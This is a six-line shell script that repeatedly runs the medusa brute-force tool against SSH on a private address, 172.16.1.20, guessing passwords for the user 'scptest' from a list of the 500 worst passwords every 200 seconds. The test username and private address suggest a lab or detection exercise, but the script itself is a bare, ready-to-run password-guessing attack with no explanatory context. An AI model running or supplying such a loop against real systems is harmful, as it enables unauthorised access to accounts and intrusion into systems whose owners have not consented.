#!/bin/sh
while true
do
    sudo medusa -h 172.16.1.20 -u scptest -P 500-worst-passwords.txt -M ssh
    sleep 200 
done
